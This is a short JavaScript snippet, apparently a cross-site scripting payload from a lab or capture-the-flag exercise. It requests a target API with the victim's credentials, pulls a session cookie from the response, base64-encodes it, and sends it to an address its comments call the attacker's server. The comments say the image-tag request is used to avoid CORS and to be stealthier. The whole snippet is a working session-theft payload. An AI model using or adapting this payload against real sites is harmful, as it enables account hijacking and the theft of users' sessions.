// Make a GET request to the target API
fetch("https://guitjapeo.thl/api/info", {
    method: 'GET',
    credentials: 'include'  // Automatically includes cookies like session cookies
})
.then(response => response.json())  // Parse the response as JSON
.then(data => {
    const sess = data.cookie;  // Extract the session cookie or token
    const encodedSess = encodeURIComponent(btoa(sess));  // Base64 encode the session token and URL-encode it

    // Use an image tag to exfiltrate data to avoid triggering CORS and to make it stealthier
    let img = new Image();
    img.src = "http://192.168.1.14/log?data=" + encodedSess;  // Send the stolen cookie to the attacker's server
})
.catch(error => console.error('Request failed', error));  // Handle errors

